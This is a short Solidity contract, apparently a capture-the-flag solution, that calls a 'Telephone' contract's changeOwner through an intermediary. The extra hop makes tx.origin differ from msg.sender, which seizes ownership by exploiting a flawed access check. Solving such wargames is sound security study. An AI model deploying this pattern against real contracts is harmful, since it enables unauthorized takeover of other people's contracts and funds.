// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneChallenge {
    ITelephone public telephone;

    constructor(address _telephone) {
        telephone = ITelephone(_telephone);
    }

    function changeOwner() external {
        telephone.changeOwner(msg.sender);
    }
}
